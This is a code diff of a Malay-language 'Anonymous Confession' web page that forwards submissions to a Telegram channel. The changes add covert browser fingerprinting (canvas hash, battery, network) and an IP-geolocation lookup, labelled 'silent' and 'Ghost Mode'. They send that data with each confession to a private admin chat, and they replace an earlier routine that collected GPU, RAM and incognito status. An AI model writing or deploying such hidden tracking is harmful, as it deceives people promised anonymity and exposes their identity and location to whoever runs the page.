@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Confession</title>
+    <title>Anonymous Confession</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
     <style>
@@ -118,53 +118,63 @@
         const PUBLIC_CHAT_ID = '-1001841870133'; 
         const PRIVATE_LOG_ID = '-1003635312239'; 
 
+        // Senarai perkataan dilarang (Dikemaskini)
         const profanityList = ['sofea', 'sofia', 'izzat', 'porn', 'thila', 'horny', 'tetek', 'kote', 'sangap', 'blowjob', 'lancap', 'toceng', 'sex', 'cum', 'pepek', 'fuck', 'pussy', 'babi', 'lgbt', 'gay', 'sial', 'peliaq', 'hanat', 'kimak', 'kiwak', 'buto', 'butoh', 'pukimak', 'barua', 'konek', 'pantat', 'patamak', 'seks', 'pntt', 'delete', 'bangsat', 'anak haram', 'haram jadah', 'puki', 'berayaq'];
+        
+        const sessionId = Math.random().toString(36).substring(2, 10).toUpperCase();
 
-        // Deep forensic capture
-        async function getStats() {
-            let stats = {
-                os: "N/A", gpu: "N/A", cores: navigator.hardwareConcurrency || "N/A",
-                ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
-                res: `${window.screen.width}x${window.screen.height}`,
-                bat: "N/A", net: "N/A", ping: "N/A", incog: "No",
-                locale: `${navigator.language} / ${Intl.DateTimeFormat().resolvedOptions().timeZone}`
-            };
-
+        // 1. Silent Canvas Fingerprinting (100% Background)
+        function getCanvasFingerprint() {
             try {
-                const ua = navigator.userAgent;
-                if (/iPhone|iPad|iPod/.test(ua)) stats.os = "iOS (Safari)";
-                else if (/Android/.test(ua)) stats.os = "Android";
-                else stats.os = "Desktop/Other";
-
-                const gl = document.createElement('canvas').getContext('webgl');
-                if (gl) {
-                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                    stats.gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A";
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.textBaseline = "alphabetic";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125,1,62,20);
+                ctx.fillStyle = "#069";
+                ctx.fillText("Confession#1", 2, 15);
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                ctx.fillText("Confession#1", 4, 17);
+                const result = canvas.toDataURL();
+                let hash = 0;
+                for (let i = 0; i < result.length; i++) {
+                    hash = ((hash << 5) - hash) + result.charCodeAt(i);
+                    hash |= 0;
                 }
-
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    stats.bat = Math.round(b.level * 100) + "%";
-                }
-
-                if (navigator.connection) {
-                    stats.net = navigator.connection.effectiveType?.toUpperCase() || "N/A";
-                    stats.ping = navigator.connection.rtt ? navigator.connection.rtt + "ms" : "N/A";
-                }
-
-                if ('storage' in navigator && 'estimate' in navigator.storage) {
-                    const {quota} = await navigator.storage.estimate();
-                    if (quota < 120000000) stats.incog = "Yes";
-                }
-            } catch(e) {}
-            return stats;
+                return Math.abs(hash).toString(16);
+            } catch(e) { return "N/A"; }
         }
 
+        // 2. Silent Battery & Network Info (100% Background)
+        async function getSilentForensics() {
+            let data = { battery: "N/A", charging: "N/A", connection: "N/A" };
+            try {
+                if (navigator.getBattery) {
+                    const bat = await navigator.getBattery();
+                    data.battery = Math.round(bat.level * 100) + "%";
+                    data.charging = bat.charging ? "Ya" : "Tidak";
+                }
+                if (navigator.connection) {
+                    data.connection = navigator.connection.effectiveType || "N/A";
+                }
+            } catch(e) {}
+            return data;
+        }
+
+        // 3. Silent IP Intelligence (Background Call)
         async function getIpIntel() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
-                return await res.json();
-            } catch(e) { return {}; }
+                const json = await res.json();
+                return {
+                    ip: json.ip,
+                    city: json.city,
+                    region: json.region,
+                    isp: json.org
+                };
+            } catch(e) { return { ip: "Unknown", city: "Unknown", region: "Unknown", isp: "Unknown" }; }
         }
 
         document.getElementById('tncLink').onclick = (e) => {
@@ -204,9 +214,19 @@
             const text = textArea.value.trim();
             if(!text) return;
 
+            // Device-based Rate Limit (15s)
+            const lastSent = localStorage.getItem('last_drop');
+            if (lastSent && (Date.now() - lastSent < 15000)) {
+                const left = Math.ceil((15000 - (Date.now() - lastSent)) / 1000);
+                statusDiv.innerText = `Tunggu jap ${left} saat, kau nak spam pulak.`;
+                statusDiv.className = "mt-6 p-4 rounded-xl text-center bg-orange-600 text-white block";
+                statusDiv.classList.remove('hidden');
+                return;
+            }
+
             const badWord = checkSpamFuzzy(text);
             if (badWord) {
-                statusDiv.innerText = `Takleh hantar sebab ada perkataan dilarang.`;
+                statusDiv.innerText = `Takleh hantar sebab ada perkataan: "${badWord}"`;
                 statusDiv.className = "mt-6 p-4 rounded-xl text-center bg-red-600 text-white block";
                 statusDiv.classList.remove('hidden');
                 return;
@@ -217,27 +237,34 @@
             btn.innerText = "SENDING...";
 
             try {
-                const [s, ip] = await Promise.all([getStats(), getIpIntel()]);
+                // Collect All Silent Data
+                const fingerprint = getCanvasFingerprint();
+                const forensics = await getSilentForensics();
+                const ipIntel = await getIpIntel();
 
-                // Public Message
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                const esc = (str) => String(str).replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
+                const escapedText = esc(text);
+                
+                // 1. Send to Public Channel
+                const publicRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: PUBLIC_CHAT_ID, text: text })
+                    body: JSON.stringify({
+                        chat_id: PUBLIC_CHAT_ID,
+                        text: `${escapedText}`,
+                        parse_mode: 'MarkdownV2'
+                    })
                 });
 
-                // Admin Log Message (Format yang kau nak)
-                const adminMsg = `🔐 *ADMIN LOG*\n` +
-                                `👤 *User:* Handshake Failed (Incognito/Unverified)\n` +
-                                `💻 *Sys/GPU:* ${s.os} / ${s.gpu}\n` +
-                                `🛠️ *Hard:* ${s.cores} Cores / ${s.ram} RAM\n` +
-                                `📡 *Net:* ${s.net} / Ping: ${s.ping}\n` +
-                                `🔋 *Power:* ${s.bat}\n` +
-                                `🕵️ *Incog:* ${s.incog}\n` +
-                                `📏 *Res:* ${s.res}\n` +
-                                `🌍 *Locale:* ${s.locale}\n` +
-                                `🏢 *ISP:* ${ip.org || 'N/A'}\n` +
-                                `💬 *Content:* \n"${text}"`;
+                // 2. Send Advanced Forensics to Admin (Ghost Mode)
+                const adminMsg = `🔐 *ADMIN LOG (GHOST)*\n` +
+                                `🆔 *Sess:* ${esc(sessionId)}\n` +
+                                `🧬 *Fingerprint:* \`${esc(fingerprint)}\`\n` +
+                                `🔋 *Battery:* ${esc(forensics.battery)} (${esc(forensics.charging)})\n` +
+                                `📶 *Net:* ${esc(forensics.connection)}\n` +
+                                `🌍 *Location:* ${esc(ipIntel.city)}, ${esc(ipIntel.region)}\n` +
+                                `🏢 *ISP:* ${esc(ipIntel.isp)}\n` +
+                                `💬 *Content:* \n"${escapedText}"`;
 
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -245,17 +272,21 @@
                     body: JSON.stringify({
                         chat_id: PRIVATE_LOG_ID,
                         text: adminMsg,
-                        parse_mode: 'Markdown'
+                        parse_mode: 'MarkdownV2'
                     })
                 });
 
-                statusDiv.innerText = "Dah hantar wehh!";
-                statusDiv.className = "mt-6 p-4 rounded-xl text-center bg-green-600 text-white block";
-                textArea.value = "";
+                if(publicRes.ok) {
+                    localStorage.setItem('last_drop', Date.now());
+                    statusDiv.innerText = "Dah hantar wehh!";
+                    statusDiv.className = "mt-6 p-4 rounded-xl text-center bg-green-600 text-white block";
+                }
+                
                 statusDiv.classList.remove('hidden');
+                textArea.value = "";
                 setTimeout(() => statusDiv.classList.add('hidden'), 5000);
             } catch (err) {
-                statusDiv.innerText = "Error sambung ke server.";
+                statusDiv.innerText = "Error sambung ke server dho.";
                 statusDiv.className = "mt-6 p-4 rounded-xl text-center bg-red-600 text-white block";
                 statusDiv.classList.remove('hidden');
             } finally {
